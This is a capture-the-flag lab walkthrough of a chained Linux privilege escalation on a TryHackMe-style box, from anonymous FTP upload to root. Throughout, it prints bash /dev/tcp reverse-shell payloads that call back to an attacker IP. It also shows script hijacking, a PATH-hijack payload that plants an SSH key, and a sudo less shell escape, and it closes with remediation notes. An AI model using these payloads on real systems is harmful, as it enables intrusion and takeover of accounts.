## Lab Summary

The objective of this challenge was to move through a chained privilege escalation path from an anonymous FTP entry point through several local users, ending with root access.

Final compromise chain:

```text
anonymous → recon_user → dev_user → monitor_user → ops_user → root
```

Confirmed lab details used during the walkthrough:

```text
Target IP: 10.128.172.193
Kali tun0 IP: 192.168.129.186
Attacker working directory: /tmp/VK
```

## Tools Used

The main tools used were:

- `rustscan` / `nmap` for initial service discovery.
- `ftp` for anonymous upload access.
- `nc` for the first reverse shell.
- `penelope` for upgraded reverse shells.
- `pspy64` for process monitoring.
- `ssh` for stable access as `monitor_user`.
- Standard Linux enumeration commands such as `id`, `find`, `ls`, `cat`, `systemctl`, and `sudo -l`.

## Initial Enumeration

The first step was to identify open services on the target.

```bash
rustscan -b 500 -a 10.128.172.193 --top -- -sC -sV -Pn -o rustscan-output.txt
```

The important findings were:

```text
21/tcp open  ftp  vsftpd 3.0.5
22/tcp open  ssh  OpenSSH 9.6p1 Ubuntu
```

The FTP service allowed anonymous login, and the `/incoming` directory was writable. This gave us the initial foothold.

## Anonymous FTP to recon_user

Anonymous FTP access allowed us to upload a shell script into `/incoming`. The target had a process that executed uploaded scripts from this location.

On Kali, we prepared a reverse shell payload.

```bash
cd /tmp/VK
cat > recon.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.129.186/4444 0>&1'
EOF
chmod +x recon.sh
```

We started a listener on Kali.

```bash
nc -lvnp 4444
```

Then we logged into FTP anonymously and uploaded the payload.

```bash
ftp 10.128.172.193
```

FTP login:

```text
Name: anonymous
Password: anonymous
```

Inside FTP:

```ftp
cd /incoming
put /tmp/VK/recon.sh recon.sh
ls -la
bye
```

After the target-side automation executed the uploaded script, the listener received a shell as `recon_user`.

We confirmed the context:

```bash
id
whoami
hostname
pwd
```

Output confirmed:

```text
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
recon_user
tryhackme-2404
/home/recon_user
```

The `recon_user` flag was readable:

```bash
cat /home/recon_user/flag.txt
```

Flag:

```text
THM{....}
```

## Local Enumeration as recon_user

We checked the home directories and found several users on the system.

```bash
ls -la /home
```

Relevant users:

```text
recon_user
dev_user
monitor_user
ops_user
ubuntu
```

We then searched for interesting files and scripts.

```bash
find /opt /srv /var/backups /tmp -maxdepth 3 \( -type f -o -type d \) 2>/dev/null | grep -Ei 'recon|dev|monitor|ops|backup|deploy|health|script|job|pipeline'
```

Important files discovered:

```text
/opt/recon/process.sh
/opt/recon/scan_uploads.sh
/opt/dev/backup.sh
/opt/dev/bin/ps
/opt/app/deploy_helper.sh
```

The `recon_user` account was also a member of the `dev_user` group. This mattered because `/opt/dev/backup.sh` was writable by that group.

```bash
ls -la /opt/dev
cat /opt/dev/backup.sh
```

Original contents:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

The file was owned by `dev_user:dev_user`, but was group-writable:

```text
-rwxrwxr-x 1 dev_user dev_user /opt/dev/backup.sh
```

This suggested that a scheduled job or automated process was executing `/opt/dev/backup.sh` as `dev_user`.

## recon_user to dev_user

Because `recon_user` could modify `/opt/dev/backup.sh`, we replaced it with a reverse shell payload.

On Kali, we started a Penelope listener:

```bash
penelope -i 192.168.129.186 -p 5556
```

From the `recon_user` shell, we replaced `/opt/dev/backup.sh`:

```bash
cat > /opt/dev/backup.sh <<'EOF'
#!/bin/bash
setsid bash -i >& /dev/tcp/192.168.129.186/5556 0>&1
EOF
chmod +x /opt/dev/backup.sh
ls -l /opt/dev/backup.sh
cat /opt/dev/backup.sh
```

After the automated process ran, Penelope received a shell as `dev_user`.

We confirmed the context:

```bash
whoami
id
pwd
```

Output confirmed:

```text
dev_user
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user)
```

The `dev_user` flag was readable:

```bash
cat /home/dev_user/flag.txt
```

Flag:

```text
THM{....}
```

## Enumeration as dev_user

The next interesting area was the healthcheck service.

```bash
systemctl status healthcheck.service --no-pager
systemctl cat healthcheck.service
cat /usr/local/bin/healthcheck
```

The systemd service showed:

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The healthcheck script contained:

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

The key issue was that the service ran as `monitor_user` and called `ps` without an absolute path. Its PATH placed `/opt/dev/bin` before `/usr/bin`, so `/opt/dev/bin/ps` would be executed instead of `/usr/bin/ps`.

The file `/opt/dev/bin/ps` was owned by `dev_user`, so from the `dev_user` shell we could replace it.

## dev_user to monitor_user

There are two possible ways to use the vulnerable `ps` call:

1. Replace `/opt/dev/bin/ps` with a reverse shell payload.
2. Replace `/opt/dev/bin/ps` with a payload that installs our SSH public key for `monitor_user`.

The SSH method produced the cleanest access.

### SSH Key Method

From the `dev_user` shell, we wrote a payload into `/opt/dev/bin/ps` to create `/home/monitor_user/.ssh/authorized_keys`.

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
echo '<PUBLIC-KEY>' >> /home/monitor_user/.ssh/authorized_keys
chmod 700 /home/monitor_user/.ssh
chmod 600 /home/monitor_user/.ssh/authorized_keys
/usr/bin/ps "$@"
EOF
chmod +x /opt/dev/bin/ps
```

Because the healthcheck service repeatedly executed `ps` as `monitor_user`, this payload was triggered automatically.

From Kali, we then connected over SSH using the matching private key.

```bash
ssh -i /tmp/VK/jump_key -o StrictHostKeyChecking=no monitor_user@10.128.172.193
```

SSH login succeeded:

```text
monitor_user@tryhackme-2404:~$
```

We confirmed access and read the flag:

```bash
whoami
id
hostname
pwd
cat /home/monitor_user/flag.txt
```

Output:

```text
monitor_user
uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)
tryhackme-2404
/home/monitor_user
THM{....}
```

Flag:

```text
THM{....}
```

### Cleanup

After SSH access as `monitor_user` was confirmed, `/opt/dev/bin/ps` could be restored from the `dev_user` shell to reduce noise:

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
/usr/bin/ps "$@"
EOF
chmod +x /opt/dev/bin/ps
```

## monitor_user to ops_user

At first, we investigated whether `/usr/local/bin/deploy.sh` was triggered by cron, systemd, or another automated process. Process monitoring with `pspy64` did not show any `ops_user` jobs or automatic execution of the deploy script.

The missing piece was `sudo -l` from a proper interactive `monitor_user` SSH session.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

This meant `monitor_user` could run `/usr/local/bin/deploy.sh` as `ops_user` without a password.

We inspected the deploy script:

```bash
cat /usr/local/bin/deploy.sh
```

Contents:

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The helper script was writable by `monitor_user`:

```bash
ls -la /opt/app /opt/app/deploy_helper.sh
```

Relevant permissions:

```text
-rwxr-xr-x 1 monitor_user monitor_user /opt/app/deploy_helper.sh
-rwxr-xr-x 1 ops_user     ops_user     /usr/local/bin/deploy.sh
```

The escalation path was therefore:

```text
monitor_user can run deploy.sh as ops_user
→ deploy.sh executes /opt/app/deploy_helper.sh
→ monitor_user can modify deploy_helper.sh
→ payload executes as ops_user
```

On Kali, we started a new Penelope listener:

```bash
penelope -i 192.168.129.186 -p 5560
```

From the `monitor_user` shell, we replaced `/opt/app/deploy_helper.sh` with a reverse shell payload and executed the sudo rule:

```bash
cat > /opt/app/deploy_helper.sh <<'EOF'
#!/bin/bash
setsid bash -i >& /dev/tcp/192.168.129.186/5560 0>&1
EOF
chmod +x /opt/app/deploy_helper.sh
sudo -u ops_user /usr/local/bin/deploy.sh
```

Penelope received a shell as `ops_user`:

```text
[New Reverse Shell] => tryhackme-2404 10.128.172.193 Linux-x86_64 ops_user(1004)
```

We confirmed the account and read the flag:

```bash
whoami
id
hostname
pwd
ls -la /home/ops_user
cat /home/ops_user/flag.txt
```

Output:

```text
ops_user
uid=1004(ops_user) gid=1004(ops_user) groups=1004(ops_user)
tryhackme-2404
/opt/app
THM{....}
```

Flag:

```text
THM{....}
```

## ops_user to root

From the `ops_user` shell, we checked sudo privileges.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

This meant `ops_user` could run `less` as root without a password.

We launched `less` as root:

```bash
sudo /usr/bin/less /etc/profile
```

Inside `less`, we used the shell escape feature:

```text
!/bin/bash
```

Because `less` was running as root, the spawned shell was also root.

We confirmed root access and read the final flag:

```bash
whoami
id
pwd
cat /root/flag.txt
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
/opt/app
THM{....}
```

Root flag:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. anonymous to recon_user

Anonymous FTP allowed upload to `/incoming`. A target-side process executed uploaded scripts, giving a reverse shell as `recon_user`.

### 2. recon_user to dev_user

`recon_user` was in the `dev_user` group and could modify `/opt/dev/backup.sh`. This script was executed as `dev_user`, allowing a reverse shell as `dev_user`.

### 3. dev_user to monitor_user

A systemd service ran `/usr/local/bin/healthcheck` as `monitor_user`. The script called `ps` without an absolute path, and the service PATH included `/opt/dev/bin` before `/usr/bin`. Since `dev_user` controlled `/opt/dev/bin/ps`, we used it to install an SSH key for `monitor_user`.

### 4. monitor_user to ops_user

`sudo -l` showed that `monitor_user` could run `/usr/local/bin/deploy.sh` as `ops_user` without a password. That script executed `/opt/app/deploy_helper.sh`, which was writable by `monitor_user`. Replacing the helper with a reverse shell gave access as `ops_user`.

### 5. ops_user to root

`sudo -l` showed that `ops_user` could run `/usr/bin/less` as root without a password. Running `less` as root and using `!/bin/bash` spawned a root shell.

## Key Lessons

This challenge demonstrated several common Linux privilege escalation patterns:

- Writable scripts executed by another user.
- Group-based write permissions creating privilege boundaries.
- PATH hijacking in service scripts.
- Unsafe use of relative command names in privileged services.
- SSH key planting after achieving code execution as a user.
- Sudo misconfiguration with `NOPASSWD` rules.
- Abuse of shell escapes in allowed binaries such as `less`.

The most important enumeration lesson was to use `sudo -l` whenever a stable interactive shell is available. In this challenge, `monitor_user → ops_user` was not triggered by cron or systemd; the intended route was a manual sudo rule.

## Remediation Notes

The vulnerabilities in this lab could be mitigated by:

- Avoiding writable scripts in directories controlled by lower-privileged users.
- Using absolute paths in scripts executed by services, especially when running as another user.
- Avoiding unsafe PATH entries in systemd service definitions.
- Reviewing group write permissions on privileged scripts.
- Restricting `sudo` rules to commands that cannot spawn shells or execute attacker-controlled files.
- Avoiding `NOPASSWD` rules unless they are strictly necessary and carefully constrained.
- Using `NOEXEC` sudo options where appropriate for pager/editor-style binaries.
